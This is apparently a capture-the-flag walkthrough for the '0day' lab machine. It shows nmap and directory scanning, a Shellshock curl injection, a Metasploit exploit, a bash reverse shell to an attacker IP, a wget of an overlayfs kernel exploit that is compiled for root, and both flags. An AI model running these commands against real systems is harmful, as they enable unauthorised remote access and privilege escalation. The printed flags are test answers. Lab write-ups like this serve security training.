# 0day Walkthrough

## Recon

I do scanning nmap with port 22, 80 open:

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)  
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)  
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)  
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)  
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))  
|_http-title: 0day  
|_http-server-header: Apache/2.4.7 (Ubuntu)  
Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.10 - 3.13 (96%), Linux 3.13 (96%), Linux 4.4 (96%), Linux 5.4 (95%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 6.0 - 9.0 (Linux 3.18 - 4.4) (92%), Android 7.1.1 - 7.1.2 (92%)  
No exact OS matches for host (test conditions non-ideal).  
Network Distance: 3 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

TRACEROUTE (using port 587/tcp)  
HOP RTT      ADDRESS  
1   16.52 ms 192.168.128.1  
2   ...  
3   17.85 ms 10.66.152.151  

There is not much that can do on SSH without credentials.

I start to do web enumeration:

Here is the result

.htaccess            (Status: 403) [Size: 289]  
.htpasswd            (Status: 403) [Size: 289]  
admin                (Status: 301) [Size: 313] [--> http://10.66.152.151/admin/]  
backup               (Status: 301) [Size: 314] [--> http://10.66.152.151/backup/]  
cgi-bin              (Status: 301) [Size: 315] [--> http://10.66.152.151/cgi-bin/]  
cgi-bin/             (Status: 403) [Size: 288]  
css                  (Status: 301) [Size: 311] [--> http://10.66.152.151/css/]  
img                  (Status: 301) [Size: 311] [--> http://10.66.152.151/img/]  
js                   (Status: 301) [Size: 310] [--> http://10.66.152.151/js/]  
robots.txt           (Status: 200) [Size: 38]  
secret               (Status: 301) [Size: 314] [--> http://10.66.152.151/secret/]  
server-status        (Status: 403) [Size: 293]  
uploads              (Status: 301) [Size: 315] [--> http://10.66.152.151/uploads/]  
Progress: 20469 / 20469 (100.00%)  

I checked http://10.66.152.151/robots.txt but not working

Then I checked with http://10.66.152.151/backup/ there is encrypted RSA private key

I tried to ssh2john and john the ripper to crack but ssh2john not working for me so i look at 

http://10.66.152.151/cgi-bin/test.cgi (hint from others' walkthrough)

The site is vulnerable to Shellshock

curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.66.152.151/cgi-bin/test.cgi  

uid=33(www-data) gid=33(www-data) groups=33(www-data)  

I do searchsploit Shellshock

and found Apache mod_cgi - 'Shellshock' Remote Command Injection                | linux/remote/34900.py  => still not working

### User Flag
Now I use Metasploit

msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhost 10.66.152.151  
rhost => 10.66.152.151   
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/test.cgi  
targeturi => /cgi-bin/test.cgi  

Dont forget to check LHOST = IP Attacker machine

msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST YOUR_IP_TUN0  
LHOST => YOUR_IP_TUN0  

Then I exploit:  
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

Session open   
meterpreter > getuid  
Server username: www-data  

Now I switch to bash by typing "execute -f /bin/bash -i" cmd and try to get get reverse shell since it is unstable shell.

Make sure listening port open nc -lvnp 4445

Then I do: bash -i >& /dev/tcp/192.168.163.235/4445 0>&1

Then I move ryan directory  
www-data@ubuntu:/home/ryan$ ls  
ls  
user.txt  

Then I cat to display user Flag
www-data@ubuntu:/home/ryan$ cat user.txt  
cat user.txt  
THM{Sh3llSh0ck_r0ckz}  

### Root Flag

OS latest version

www-data@ubuntu:/home/ryan$ uname -r  
uname -r  
3.13.0-32-generic  

Then I move to this directory to upload file www-data@ubuntu:/$ cd dev/shm 
cd dev/shm where i can store temp file and it deleted after reboot

I copied ofs.c file from this CVE (https://www.exploit-db.com/exploits/37292)

In victim machine with dev/shm directory, i do wget http://192.168.163.235:9000/ofs.c


Make sure python3 -m http.server 9000 to check if the file is transfer successfully

After that I gcc ofs.c -o exploit to compile code with gcc

Then I do ./exploit

Then I go to root directory

cd /root  
ls  
root.txt  
cat root.txt  
THM{g00d_j0b_0day_is_Pleased}  
